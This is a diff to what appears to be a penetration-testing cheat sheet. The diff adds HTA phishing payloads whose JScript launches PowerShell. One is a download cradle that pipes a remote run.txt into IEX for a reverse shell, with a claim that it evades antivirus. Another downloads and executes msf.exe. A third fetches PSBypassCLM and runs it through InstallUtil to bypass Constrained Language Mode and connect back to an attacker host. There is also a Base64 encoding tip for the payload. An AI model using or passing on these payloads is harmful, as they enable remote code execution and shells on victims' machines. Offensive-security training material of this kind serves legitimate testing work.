@@ -16,6 +16,28 @@ $ smtp-user-enum -M EXPN -D example.com -U users.txt -t 10.0.0.1
 - Payload from simple to complex
 - We call the below evil.hta
 
+**Simple Powershell Download Cradle and RevShell via TCPSocket**
+- Can evade AV because of the use of "non-standard" var names
+```html
+<html>
+<head>
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+var r = shell.Run("powershell.exe (New-Object System.Net.WebClient).DownloadString('http://<ip>/run.txt')| IEX);
+</script>
+</head>
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body>
+</html>
+```
+run.txt here > ![]()
+
+For run.txt, you can also Base64 Encode it but if you are using cyberchef, remember to Encode Text (UTF-16 LE) recipe before Base64 encode recipe!
+![alt text](image.png)
+
 **Simple Powershell Download EXE and Execute**
 - No AMSI and Applocker bypass so will likely download the EXE but fail to execute
 
@@ -24,7 +46,26 @@ $ smtp-user-enum -M EXPN -D example.com -U users.txt -t 10.0.0.1
 <head>
 <script language="JScript">
 var shell = new ActiveXObject("WScript.Shell");
-var r = shell.Run("powershell.exe iwr -uri http://<ip>/msf.exe -outfile C:\\users\\public\\msf.exe; C:\\users\\public\\rmsf.exe");
+var r = shell.Run("powershell.exe iwr -uri http://<ip>/msf.exe -outfile C:\\users\\public\\msf.exe; C:\\users\\public\\msf.exe");
+</script>
+</head>
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body>
+</html>
+```
+
+**PSBypassCLM Rev Shell**
+- Requires InstalUtil. Bypasses CLM for that session
+
+```html
+<html>
+<head>
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+var r = shell.Run("powershell.exe iwr -uri http://<ip>/psbypassclm.exe -outfile C:\\users\\public\\bypass.exe; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=<kali ip> /rport=443 /U c:\\Users\\Public\\bypass.exe");
 </script>
 </head>
 <body>
